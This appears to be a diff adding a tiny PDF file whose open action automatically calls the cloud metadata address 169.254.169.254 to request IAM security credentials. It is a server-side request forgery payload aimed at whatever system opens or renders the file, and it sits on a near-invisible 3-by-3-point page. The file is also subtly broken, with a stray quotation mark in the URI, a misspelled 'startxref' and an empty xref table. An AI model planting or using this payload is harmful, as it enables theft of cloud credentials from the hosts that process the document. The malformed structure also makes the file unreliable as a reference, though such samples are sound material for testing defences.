@@ -1,0 +1,14 @@
+%PDF-1.7
+1 0 obj
+<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R>> endobj
+2 0 obj
+<</Type/Pages/Kids[4 0 R]/Count 1>> endobj
+3 0 obj
+<</Type/Action/S/URI/URI(http://169.254.169.254/latest/meta-data/iam/security-credentials/')>> endobj
+4 0 obj
+<</Type/Page/Parent 2 0 R/MediaBox[0 0 3 3]>> endobj
+xref
+trailer <</Size 5/Root 1 0 R>>
+martxref
+122
+%%EOF
